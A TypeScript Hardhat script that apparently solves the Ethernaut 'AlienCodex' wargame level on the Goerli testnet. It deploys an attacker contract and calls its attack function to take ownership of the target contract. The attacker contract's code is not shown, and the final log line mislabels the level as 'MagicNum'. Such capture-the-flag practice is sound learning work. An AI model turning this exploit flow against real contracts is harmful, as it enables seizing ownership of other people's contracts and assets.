import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "AlienCodex"
const CONTRACT_ADDRESS = "0x8EF7F2b487f232d82bc5dDE2749e8BC4FEF7F49b"
const CONTRACT_NAME_ATTACKER = "AlienCodexAttacker"

async function main() {
    const AlienCodex = await ethers.getContractFactory(CONTRACT_NAME)
    const contract = AlienCodex.attach(CONTRACT_ADDRESS)

    const AlienCodexAttacker = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const contractAttacker = await AlienCodexAttacker.connect(attacker).deploy()
    await contractAttacker.deployed()

    let tx: TransactionResponse = await contractAttacker.connect(attacker).attack(CONTRACT_ADDRESS)
    await tx.wait()

    console.log("MagicNum: claimed ownership of the contract");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });